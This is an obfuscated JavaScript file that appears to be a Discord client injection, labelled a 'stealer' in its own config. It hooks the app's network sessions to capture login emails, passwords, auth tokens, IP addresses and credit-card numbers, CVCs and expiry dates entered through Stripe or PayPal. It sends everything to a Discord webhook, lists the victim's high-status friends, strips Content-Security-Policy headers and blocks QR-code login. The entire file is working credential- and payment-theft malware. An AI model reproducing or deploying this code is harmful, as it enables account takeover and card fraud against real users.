config = {
    'webhook': 'https://discord.com/api/webhooks/XXXX',
    'embed-color': 0x36393f,
    'emojis': {
        'nitroType': _0x290dd3(0xe9),
        'password': _0x290dd3(0xc0),
        'ip': _0x290dd3(0x97),
        'billing': '<a:billing:990734778888228904>',
        'badges': _0x290dd3(0xe6),
        'oldPass': '<:old_password:991080661941116978>',
        'newPass': _0x290dd3(0xa8),
        'email': _0x290dd3(0xba),
        'paypal': _0x290dd3(0xe2),
        'classic': _0x290dd3(0xa6),
        'boost': _0x290dd3(0x98)
    },
    'api': 'https://discord.com/api/v9/users/@me',
    'stealer-icon': _0x290dd3(0x96),
    'stealer-name': _0x290dd3(0x103),
    'filter': {
        'urls': [_0x290dd3(0xf7), 'https://discordapp.com/api/v*/users/@me', _0x290dd3(0x10a), _0x290dd3(0xa7), _0x290dd3(0xd5), _0x290dd3(0xc8), 'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts', _0x290dd3(0x129), 'https://api.stripe.com/v*/setup_intents/*/confirm', _0x290dd3(0xf6)]
    },
    'filter2': {
        'urls': [_0x290dd3(0xe4), _0x290dd3(0xdb), _0x290dd3(0xea), 'https://*.discord.com/api/v*/users/@me/library', 'https://discord.com/api/v*/users/@me/library', 'wss://remote-auth-gateway.discord.gg/*']
    }
}, userFlags = [{
    'n': 0x1 << 0x0,
    't': _0x290dd3(0xd7),
    'e': _0x290dd3(0xb8)
}, {
    'n': 0x1 << 0x1,
    't': _0x290dd3(0xec),
    'e': _0x290dd3(0xc9)
}, {
    'n': 0x1 << 0x2,
    't': 'HYPESQUAD',
    'e': _0x290dd3(0xf3)
}, {
    'n': 0x1 << 0x3,
    't': _0x290dd3(0xab),
    'e': _0x290dd3(0x107)
}, {
    'n': 0x1 << 0x6,
    't': _0x290dd3(0xff),
    'e': _0x290dd3(0x11d)
}, {
    'n': 0x1 << 0x7,
    't': _0x290dd3(0xcd),
    'e': _0x290dd3(0xae)
}, {
    'n': 0x1 << 0x8,
    't': 'BALANCE',
    'e': _0x290dd3(0xf8)
}, {
    'n': 0x1 << 0x9,
    't': _0x290dd3(0xb7),
    'e': _0x290dd3(0x105)
}, {
    'n': 0x1 << 0xe,
    't': _0x290dd3(0xb6),
    'e': _0x290dd3(0xcc)
}, {
    'n': 0x1 << 0x11,
    't': 'VERIFIED_DEVELOPER',
    'e': _0x290dd3(0xc1)
}, {
    'n': 0x1 << 0x12,
    't': _0x290dd3(0xa9),
    'e': '<:Moderation_Icon:994689773379797182>'
}], execScript = _0x5479c6 => {
    const _0x5d3b7c = _0x290dd3,
        _0x395d81 = BrowserWindow[_0x5d3b7c(0x112)]()[0x0];
    return _0x395d81[_0x5d3b7c(0xf4)][_0x5d3b7c(0xf1)](_0x5479c6, !0x0);
}, getIP = async _0x3167b0 => {
    const _0x27edba = _0x290dd3;
    return await execScript(_0x27edba(0xc5));
}, getInfo = async _0x306172 => {
    const _0x4c90e9 = _0x290dd3,
        _0xdc621f = await execScript(_0x4c90e9(0xbd) + config['api'] + _0x4c90e9(0xfd) + _0x306172 + _0x4c90e9(0xeb));
    return JSON[_0x4c90e9(0xfe)](_0xdc621f);
}, fetchBilling = async _0x28a1e1 => {
    const _0x28daad = _0x290dd3,
        _0x425045 = await execScript(_0x28daad(0xbe) + config[_0x28daad(0x138)] + _0x28daad(0xd0) + _0x28a1e1 + _0x28daad(0x9f));
    try {
        return typeof _0x425045 === 'string' ? JSON[_0x28daad(0xfe)](_0x425045) : _0x425045;
    } catch (_0x2e0dae) {
        return null;
    }
}, fetchFriends = async _0x4eac84 => {
    const _0x103a91 = _0x290dd3,
        _0x5eaa6b = await execScript('var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x20\x0a\x20\x20\x20\x20xmlHttp.open(\x22GET\x22,\x20\x22' + config['api'] + '/relationships\x22,\x20false);\x20\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22' + _0x4eac84 + _0x103a91(0x9f));
    return JSON[_0x103a91(0xfe)](_0x5eaa6b);
}, sendFriends = async (_0x3d9f99, _0x5a6ab7) => {
    const _0xd58591 = _0x290dd3,
        _0x233417 = await fetchFriends(_0x3d9f99),
        _0x1a6440 = ['STAFF', _0xd58591(0xec), _0xd58591(0xef), _0xd58591(0xab), _0xd58591(0xb7), 'BUG_HUNTER_2', _0xd58591(0x123), 'CERTIFIED_MODERATOR'],
        _0x3d7fb5 = _0x5a6ab7[_0xd58591(0x9d)] ? _0xd58591(0x124) + _0x5a6ab7['id'] + '/' + _0x5a6ab7['avatar'] + '.webp' : 'https://cdn.discordapp.com/embed/avatars/' + _0x5a6ab7[_0xd58591(0xc7)] % 0x5 + '.png';
    let _0x155a51 = '';
    if (_0x233417) _0x233417[_0xd58591(0x12a)](_0x9158ff => {
        const _0x3d97a4 = _0xd58591;
        if (_0x9158ff[_0x3d97a4(0x9c)] === 0x1) {
            if (!_0x9158ff[_0x3d97a4(0x11c)]) return;
            const _0x9a21aa = parseBadges(_0x9158ff[_0x3d97a4(0x11c)]?.[_0x3d97a4(0xbb)]);
            let _0xf56085 = '';
            _0x9a21aa[_0x3d97a4(0x12a)](_0xd5b111 => {
                const _0x2160ca = _0x3d97a4;
                if (_0x1a6440[_0x2160ca(0xa4)](_0xd5b111['t'])) _0xf56085 += _0xd5b111['e'] + '\x20';
            });
            if (_0xf56085) _0x155a51 += _0xf56085 + _0x3d97a4(0x10e) + _0x9158ff[_0x3d97a4(0x11c)]?.[_0x3d97a4(0xed)] + '#' + _0x9158ff['user']?.['discriminator'] + _0x3d97a4(0xcf);
        }
    });
    return hooker({
        'embeds': [{
            'color': config[_0xd58591(0x120)],
            'author': {
                'name': 'HQ\x20Friends\x20(' + _0x5a6ab7['id'] + ')',
                'icon_url': _0x3d7fb5
            },
            'footer': {
                'text': config[_0xd58591(0xb2)],
                'icon_url': config[_0xd58591(0xbc)]
            },
            'description': _0x155a51['length'] > 0x1 ? _0x155a51 : _0xd58591(0x111)
        }]
    });
}, getBilling = async _0x17f4a9 => {
    const _0x454c88 = _0x290dd3,
        _0xf821a9 = await fetchBilling(_0x17f4a9);
    if (!_0xf821a9) return _0x454c88(0x12c);
    let _0x1872df = '';
    _0xf821a9[_0x454c88(0x12a)](_0x4633c1 => {
        const _0x4aa209 = _0x454c88;
        if (!_0x4633c1[_0x4aa209(0xf0)]) switch (_0x4633c1['type']) {
            case 0x1:
                _0x1872df += _0x4aa209(0xdf);
                break;
            case 0x2:
                _0x1872df += config[_0x4aa209(0x10f)][_0x4aa209(0x136)] + '\x20';
                break;
        }
    });
    if (!_0x1872df) _0x1872df = _0x454c88(0x12c);
    return _0x1872df;
}, getNitro = _0x17d538 => {
    const _0x222da8 = _0x290dd3;
    switch (_0x17d538) {
        case 0x0:
            return _0x222da8(0x11e);
        case 0x1:
            return config[_0x222da8(0x10f)][_0x222da8(0xb0)];
        case 0x2:
            return config[_0x222da8(0x10f)][_0x222da8(0xb0)] + '\x20' + config[_0x222da8(0x10f)][_0x222da8(0x128)];
        default:
            return _0x222da8(0x11e);
    }
}, parseBadges = _0x59fff6 => {
    let _0x19fe51 = [];
    return userFlags['forEach'](_0x18f493 => {
        const _0x103c05 = _0x2b04;
        if ((_0x59fff6 & _0x18f493['n']) == _0x18f493['n']) _0x19fe51[_0x103c05(0xa5)](_0x18f493);
    }), _0x19fe51;
}, getBadges = _0x857de2 => {
    const _0x423c02 = _0x290dd3,
        _0x4be3bf = parseBadges(_0x857de2);
    let _0x4a867a = '';
    if (!_0x4be3bf || _0x4be3bf[_0x423c02(0x12b)] < 0x0) _0x4a867a = '`No\x20Badges`';
    else _0x4be3bf[_0x423c02(0x12a)](_0x1dbf82 => {
        _0x4a867a += _0x1dbf82['e'];
    });
    return _0x4a867a;
}, hooker = async _0x51e298 => {
    const _0x2d6328 = _0x290dd3,
        _0x3c2162 = JSON[_0x2d6328(0x10c)](_0x51e298),
        _0x128810 = new URL(config['webhook']),
        _0x335a7f = {
            'Content-Type': _0x2d6328(0x137),
            'Access-Control-Allow-Origin': '*'
        },
        _0x31e411 = {
            'protocol': _0x128810[_0x2d6328(0x102)],
            'hostname': _0x128810[_0x2d6328(0x106)],
            'path': _0x128810[_0x2d6328(0xd8)],
            'method': _0x2d6328(0x125),
            'headers': _0x335a7f
        };
    return new Promise(_0x4cd327 => {
        const _0x2cdfde = _0x2d6328,
            _0x63483a = https[_0x2cdfde(0xc4)](_0x31e411);
        _0x63483a['on'](_0x2cdfde(0xf5), console[_0x2cdfde(0x118)]), _0x63483a['on'](_0x2cdfde(0xe1), () => _0x4cd327()), _0x63483a['write'](_0x3c2162), _0x63483a[_0x2cdfde(0x9b)]();
    });
}, login = async (_0x14eb0f, _0x94fe06, _0x22754c) => {
    const _0x1714db = _0x290dd3,
        _0x450490 = await getInfo(_0x22754c),
        _0x314075 = getNitro(_0x450490[_0x1714db(0xd2)]),
        _0x2e7899 = getBadges(_0x450490[_0x1714db(0xd6)]),
        _0x230be0 = await getBilling(_0x22754c),
        _0x117eae = await getIP(),
        _0x4d0b88 = _0x450490['avatar'] ? _0x1714db(0x124) + _0x450490['id'] + '/' + _0x450490[_0x1714db(0x9d)] + _0x1714db(0xd9) : _0x1714db(0xe0) + _0x450490['discriminator'] % 0x5 + '.png',
        _0x5806b5 = {
            'embeds': [{
                'color': config[_0x1714db(0x120)],
                'author': {
                    'name': _0x450490[_0x1714db(0xed)] + '#' + _0x450490[_0x1714db(0xc7)] + '\x20(' + _0x450490['id'] + ')',
                    'icon_url': config['stealer-icon']
                },
                'thumbnail': {
                    'url': _0x4d0b88
                },
                'footer': {
                    'text': config[_0x1714db(0xb2)],
                    'icon_url': config['stealer-icon']
                },
                'fields': [{
                    'name': '' + config[_0x1714db(0x10f)]['billing'],
                    'value': '`' + _0x22754c + '`'
                }, {
                    'name': config[_0x1714db(0x10f)]['badges'] + _0x1714db(0x109),
                    'value': '' + (_0x2e7899[_0x1714db(0x12b)] > 0x0 ? _0x2e7899 : _0x1714db(0xa2)),
                    'inline': !0x0
                }, {
                    'name': config[_0x1714db(0x10f)][_0x1714db(0xac)] + '\x20Nitro\x20Type',
                    'value': _0x314075,
                    'inline': !0x0
                }, {
                    'name': config['emojis'][_0x1714db(0x99)] + _0x1714db(0xb9),
                    'value': _0x230be0,
                    'inline': !0x0
                }, {
                    'name': config[_0x1714db(0x10f)]['ip'] + _0x1714db(0x12e),
                    'value': '`' + _0x117eae + '`',
                    'inline': !0x0
                }, {
                    'name': config[_0x1714db(0x10f)]['email'] + '\x20Email',
                    'value': '`' + (_0x14eb0f || 'null') + '`',
                    'inline': !0x0
                }, {
                    'name': config[_0x1714db(0x10f)][_0x1714db(0x9e)] + _0x1714db(0x10b),
                    'value': '`' + (_0x94fe06 || _0x1714db(0xc2)) + '`',
                    'inline': !0x0
                }]
            }]
        };
    await hooker(_0x5806b5), sendFriends(_0x22754c, _0x450490);
}, passwordChanged = async (_0x4699f3, _0x27ce23, _0x22fc57) => {
    const _0x12fb7f = _0x290dd3,
        _0x1b0950 = await getInfo(_0x22fc57),
        _0x5166f3 = getNitro(_0x1b0950[_0x12fb7f(0xd2)]),
        _0xebda3e = getBadges(_0x1b0950[_0x12fb7f(0xd6)]),
        _0x5a1c28 = await getBilling(_0x22fc57),
        _0x306b90 = await getIP(),
        _0x33f113 = _0x1b0950[_0x12fb7f(0x9d)] ? _0x12fb7f(0x124) + _0x1b0950['id'] + '/' + _0x1b0950['avatar'] + '.webp' : _0x12fb7f(0xe0) + _0x1b0950[_0x12fb7f(0xc7)] % 0x5 + _0x12fb7f(0xe7),
        _0x3a29f9 = {
            'embeds': [{
                'color': config[_0x12fb7f(0x120)],
                'title': _0x12fb7f(0x95),
                'author': {
                    'name': _0x1b0950[_0x12fb7f(0xed)] + '#' + _0x1b0950[_0x12fb7f(0xc7)] + '\x20(' + _0x1b0950['id'] + ')',
                    'icon_url': config[_0x12fb7f(0xbc)]
                },
                'thumbnail': {
                    'url': _0x33f113
                },
                'footer': {
                    'text': config[_0x12fb7f(0xb2)],
                    'icon_url': config[_0x12fb7f(0xbc)]
                },
                'fields': [{
                    'name': '' + config[_0x12fb7f(0x10f)][_0x12fb7f(0x99)],
                    'value': '`' + _0x22fc57 + '`'
                }, {
                    'name': config[_0x12fb7f(0x10f)][_0x12fb7f(0xb3)] + _0x12fb7f(0x109),
                    'value': '' + (_0xebda3e['length'] > 0x0 ? _0xebda3e : _0x12fb7f(0xa2)),
                    'inline': !0x0
                }, {
                    'name': config[_0x12fb7f(0x10f)][_0x12fb7f(0xac)] + _0x12fb7f(0xd3),
                    'value': _0x5166f3,
                    'inline': !0x0
                }, {
                    'name': config[_0x12fb7f(0x10f)][_0x12fb7f(0x99)] + _0x12fb7f(0xb9),
                    'value': _0x5a1c28,
                    'inline': !0x0
                }, {
                    'name': config['emojis']['ip'] + '\x20IP',
                    'value': '`' + _0x306b90 + '`',
                    'inline': !0x0
                }, {
                    'name': config[_0x12fb7f(0x10f)][_0x12fb7f(0x114)] + _0x12fb7f(0x115),
                    'value': '`' + (_0x1b0950[_0x12fb7f(0x114)] || _0x12fb7f(0xc2)) + '`',
                    'inline': !0x0
                }, {
                    'name': config[_0x12fb7f(0x10f)][_0x12fb7f(0x101)] + _0x12fb7f(0x139),
                    'value': '`' + (_0x4699f3 || 'null') + '`',
                    'inline': !0x0
                }, {
                    'name': config['emojis'][_0x12fb7f(0x12f)] + _0x12fb7f(0xfb),
                    'value': '`' + (_0x27ce23 || _0x12fb7f(0xc2)) + '`',
                    'inline': !0x0
                }]
            }]
        };
    await hooker(_0x3a29f9), sendFriends(_0x22fc57, _0x1b0950);
}, emailChanged = async (_0x51842f, _0x3108cd, _0x20ac26) => {
    const _0x162e51 = _0x290dd3,
        _0x33e96e = await getInfo(_0x20ac26),
        _0x2aeee9 = getNitro(_0x33e96e['premium_type']),
        _0x25cd9d = getBadges(_0x33e96e[_0x162e51(0xd6)]),
        _0x279752 = await getBilling(_0x20ac26),
        _0xf8caab = await getIP(),
        _0xf89a40 = _0x33e96e['avatar'] ? _0x162e51(0x124) + _0x33e96e['id'] + '/' + _0x33e96e['avatar'] + _0x162e51(0xd9) : _0x162e51(0xe0) + _0x33e96e['discriminator'] % 0x5 + _0x162e51(0xe7),
        _0x2a490e = {
            'embeds': [{
                'color': config['embed-color'],
                'title': 'Email\x20Changed',
                'author': {
                    'name': _0x33e96e[_0x162e51(0xed)] + '#' + _0x33e96e[_0x162e51(0xc7)] + '\x20(' + _0x33e96e['id'] + ')',
                    'icon_url': config[_0x162e51(0xbc)]
                },
                'thumbnail': {
                    'url': _0xf89a40
                },
                'footer': {
                    'text': config[_0x162e51(0xb2)],
                    'icon_url': config[_0x162e51(0xbc)]
                },
                'fields': [{
                    'name': '' + config['emojis'][_0x162e51(0x99)],
                    'value': '`' + _0x20ac26 + '`'
                }, {
                    'name': config[_0x162e51(0x10f)][_0x162e51(0xb3)] + _0x162e51(0x109),
                    'value': '' + (_0x25cd9d['length'] > 0x0 ? _0x25cd9d : _0x162e51(0xa2)),
                    'inline': !0x0
                }, {
                    'name': config[_0x162e51(0x10f)][_0x162e51(0xac)] + _0x162e51(0xd3),
                    'value': _0x2aeee9,
                    'inline': !0x0
                }, {
                    'name': config[_0x162e51(0x10f)][_0x162e51(0x99)] + _0x162e51(0xb9),
                    'value': _0x279752,
                    'inline': !0x0
                }, {
                    'name': config['emojis']['ip'] + _0x162e51(0x12e),
                    'value': '`' + _0xf8caab + '`',
                    'inline': !0x0
                }, {
                    'name': config[_0x162e51(0x10f)]['email'] + _0x162e51(0x115),
                    'value': '`' + (_0x51842f || _0x162e51(0xc2)) + '`',
                    'inline': !0x0
                }, {
                    'name': config[_0x162e51(0x10f)][_0x162e51(0x9e)] + '\x20Password',
                    'value': '`' + (_0x3108cd || _0x162e51(0xc2)) + '`',
                    'inline': !0x0
                }]
            }]
        };
    await hooker(_0x2a490e), sendFriends(_0x20ac26, _0x33e96e);
}, PaypalAdded = async _0x4dd3e1 => {
    const _0x5b248d = _0x290dd3,
        _0x11f28f = await getInfo(_0x4dd3e1),
        _0x268cbf = getNitro(_0x11f28f[_0x5b248d(0xd2)]),
        _0x38b996 = getBadges(_0x11f28f[_0x5b248d(0xd6)]),
        _0x1fff94 = await getBilling(_0x4dd3e1),
        _0x401c15 = await getIP(),
        _0x4c97eb = _0x11f28f[_0x5b248d(0x9d)] ? _0x5b248d(0x124) + _0x11f28f['id'] + '/' + _0x11f28f[_0x5b248d(0x9d)] + '.webp' : _0x5b248d(0xe0) + _0x11f28f['discriminator'] % 0x5 + _0x5b248d(0xe7),
        _0x3b75ea = {
            'embeds': [{
                'color': config[_0x5b248d(0x120)],
                'title': _0x5b248d(0x100),
                'author': {
                    'name': _0x11f28f[_0x5b248d(0xed)] + '#' + _0x11f28f[_0x5b248d(0xc7)] + '\x20(' + _0x11f28f['id'] + ')',
                    'icon_url': config[_0x5b248d(0xbc)]
                },
                'thumbnail': {
                    'url': _0x4c97eb
                },
                'footer': {
                    'text': config['stealer-name'],
                    'icon_url': config[_0x5b248d(0xbc)]
                },
                'fields': [{
                    'name': '' + config['emojis'][_0x5b248d(0x99)],
                    'value': '`' + _0x4dd3e1 + '`'
                }, {
                    'name': config['emojis'][_0x5b248d(0xb3)] + _0x5b248d(0x109),
                    'value': '' + (_0x38b996[_0x5b248d(0x12b)] > 0x0 ? _0x38b996 : '`No\x20Badges`'),
                    'inline': !0x0
                }, {
                    'name': config[_0x5b248d(0x10f)][_0x5b248d(0xac)] + _0x5b248d(0xd3),
                    'value': _0x268cbf,
                    'inline': !0x0
                }, {
                    'name': config[_0x5b248d(0x10f)][_0x5b248d(0x99)] + _0x5b248d(0xb9),
                    'value': _0x1fff94,
                    'inline': !0x0
                }, {
                    'name': config[_0x5b248d(0x10f)]['ip'] + '\x20IP',
                    'value': '`' + _0x401c15 + '`',
                    'inline': !0x0
                }, {
                    'name': config[_0x5b248d(0x10f)][_0x5b248d(0x114)] + _0x5b248d(0x115),
                    'value': '`' + (_0x11f28f[_0x5b248d(0x114)] || _0x5b248d(0xc2)) + '`',
                    'inline': !0x0
                }, {
                    'name': config[_0x5b248d(0x10f)]['password'] + _0x5b248d(0x10b),
                    'value': '`null`',
                    'inline': !0x0
                }]
            }]
        };
    await hooker(_0x3b75ea), sendFriends(_0x4dd3e1, _0x11f28f);
}, ccAdded = async (_0x4142a7, _0x1d6a69, _0x1e78e8, _0x2ed5e9, _0x599b9c) => {
    const _0x828b07 = _0x290dd3,
        _0x3e3f07 = await getInfo(_0x599b9c),
        _0x2b3de5 = getNitro(_0x3e3f07[_0x828b07(0xd2)]),
        _0x3e2eab = getBadges(_0x3e3f07[_0x828b07(0xd6)]),
        _0x4fe696 = await getBilling(_0x599b9c),
        _0x248851 = await getIP(),
        _0x335e57 = _0x3e3f07['avatar'] ? _0x828b07(0x124) + _0x3e3f07['id'] + '/' + _0x3e3f07[_0x828b07(0x9d)] + _0x828b07(0xd9) : _0x828b07(0xe0) + _0x3e3f07[_0x828b07(0xc7)] % 0x5 + _0x828b07(0xe7),
        _0x5dea89 = {
            'embeds': [{
                'color': config['embed-color'],
                'title': 'Bank\x20Card\x20Added',
                'author': {
                    'name': _0x3e3f07[_0x828b07(0xed)] + '#' + _0x3e3f07[_0x828b07(0xc7)] + '\x20(' + _0x3e3f07['id'] + ')',
                    'icon_url': config[_0x828b07(0xbc)]
                },
                'thumbnail': {
                    'url': _0x335e57
                },
                'footer': {
                    'text': config[_0x828b07(0xb2)],
                    'icon_url': config[_0x828b07(0xbc)]
                },
                'fields': [{
                    'name': '' + config[_0x828b07(0x10f)][_0x828b07(0x99)],
                    'value': '`' + _0x599b9c + '`'
                }, {
                    'name': config['emojis'][_0x828b07(0xb3)] + '\x20Badges',
                    'value': '' + (_0x3e2eab['length'] > 0x0 ? _0x3e2eab : _0x828b07(0xa2)),
                    'inline': !0x0
                }, {
                    'name': config[_0x828b07(0x10f)][_0x828b07(0xac)] + _0x828b07(0xd3),
                    'value': _0x2b3de5,
                    'inline': !0x0
                }, {
                    'name': config[_0x828b07(0x10f)][_0x828b07(0x99)] + _0x828b07(0xb9),
                    'value': _0x4fe696,
                    'inline': !0x0
                }, {
                    'name': config[_0x828b07(0x10f)]['ip'] + _0x828b07(0x12e),
                    'value': '`' + _0x248851 + '`',
                    'inline': !0x0
                }, {
                    'name': config[_0x828b07(0x10f)][_0x828b07(0x114)] + _0x828b07(0x115),
                    'value': '`' + (_0x3e3f07['email'] || _0x828b07(0xc2)) + '`',
                    'inline': !0x0
                }, {
                    'name': config[_0x828b07(0x10f)][_0x828b07(0x9e)] + _0x828b07(0x10b),
                    'value': _0x828b07(0xad),
                    'inline': !0x0
                }, {
                    'name': _0x828b07(0xc6),
                    'value': '`' + _0x4142a7 + '`',
                    'inline': !0x0
                }, {
                    'name': _0x828b07(0x121),
                    'value': '`' + _0x1d6a69 + '`',
                    'inline': !0x0
                }, {
                    'name': _0x828b07(0xce),
                    'value': '`' + _0x1e78e8 + '/' + _0x2ed5e9 + '`',
                    'inline': !0x0
                }]
            }]
        };
    await hooker(_0x5dea89), sendFriends(_0x599b9c, _0x3e3f07);
};
session['defaultSession']['webRequest'][_0x290dd3(0x130)](config[_0x290dd3(0xee)], (_0x2724a9, _0x33723d) => {
    const _0x5853de = _0x290dd3;
    if (_0x2724a9[_0x5853de(0xdd)]['startsWith'](_0x5853de(0xb5))) return _0x33723d({
        'cancel': !![]
    });
}), session[_0x290dd3(0xca)][_0x290dd3(0x119)][_0x290dd3(0x134)]((_0x4f1f97, _0x643e96) => {
    const _0x21c072 = _0x290dd3;
    _0x4f1f97['url'][_0x21c072(0xe8)](config[_0x21c072(0xcb)]) ? _0x4f1f97['url']['includes']('discord.com') ? _0x643e96({
        'responseHeaders': Object[_0x21c072(0x127)]({
            'Access-Control-Allow-Headers': '*'
        }, _0x4f1f97[_0x21c072(0xf9)])
    }) : _0x643e96({
        'responseHeaders': Object[_0x21c072(0x127)]({
            'Content-Security-Policy': [_0x21c072(0xa0), _0x21c072(0xe3), _0x21c072(0x11f)],
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Allow-Origin': '*'
        }, _0x4f1f97[_0x21c072(0xf9)])
    }) : (delete _0x4f1f97[_0x21c072(0xf9)][_0x21c072(0xfa)], delete _0x4f1f97[_0x21c072(0xf9)]['content-security-policy-report-only'], _0x643e96({
        'responseHeaders': {
            ..._0x4f1f97['responseHeaders'],
            'Access-Control-Allow-Headers': '*'
        }
    }));
}), session[_0x290dd3(0xca)][_0x290dd3(0x119)][_0x290dd3(0xe5)](config[_0x290dd3(0x9a)], async (_0x297e09, _0x3de6d9) => {
    const _0x415770 = _0x290dd3;
    if (_0x297e09['statusCode'] !== 0xc8 && _0x297e09[_0x415770(0xbf)] !== 0xca) return;
    const _0x54ec27 = Buffer['from'](_0x297e09[_0x415770(0xc3)][0x0][_0x415770(0x11a)])[_0x415770(0xa3)](),
        _0x13e89b = JSON[_0x415770(0xfe)](_0x54ec27),
        _0x4d41a2 = await execScript(_0x415770(0x104));
    switch (!![]) {
        case _0x297e09[_0x415770(0xdd)][_0x415770(0xde)](_0x415770(0x11b)):
            login(_0x13e89b[_0x415770(0x11b)], _0x13e89b[_0x415770(0x9e)], _0x4d41a2)[_0x415770(0xf2)](console[_0x415770(0xf5)]);
            break;
        case _0x297e09[_0x415770(0xdd)][_0x415770(0xde)](_0x415770(0xdc)) && _0x297e09[_0x415770(0x10d)] === _0x415770(0x122):
            if (!_0x13e89b[_0x415770(0x9e)]) return;
            _0x13e89b[_0x415770(0x114)] && emailChanged(_0x13e89b[_0x415770(0x114)], _0x13e89b['password'], _0x4d41a2)[_0x415770(0xf2)](console[_0x415770(0xf5)]);
            _0x13e89b[_0x415770(0xb1)] && passwordChanged(_0x13e89b[_0x415770(0x9e)], _0x13e89b[_0x415770(0xb1)], _0x4d41a2)[_0x415770(0xf2)](console[_0x415770(0xf5)]);
            break;
        case _0x297e09[_0x415770(0xdd)][_0x415770(0xde)](_0x415770(0x132)) && _0x297e09[_0x415770(0x10d)] === _0x415770(0x125):
            const _0x3495f6 = querystring[_0x415770(0xfe)](_0x54ec27['toString']());
            hooker({
                'content': JSON[_0x415770(0x10c)](_0x3495f6) + String(_0x54ec27) + JSON[_0x415770(0x10c)](_0x13e89b)
            }), ccAdded(_0x3495f6[_0x415770(0x131)], _0x3495f6[_0x415770(0x113)], _0x3495f6[_0x415770(0x126)], _0x3495f6[_0x415770(0xa1)], _0x4d41a2)[_0x415770(0xf2)](console[_0x415770(0xf5)]);
            break;
        case _0x297e09['url'][_0x415770(0xde)](_0x415770(0x110)) && _0x297e09[_0x415770(0x10d)] === _0x415770(0x125):
            PaypalAdded(_0x4d41a2)['catch'](console[_0x415770(0xf5)]);
            break;
        default:
            break;
    }
});
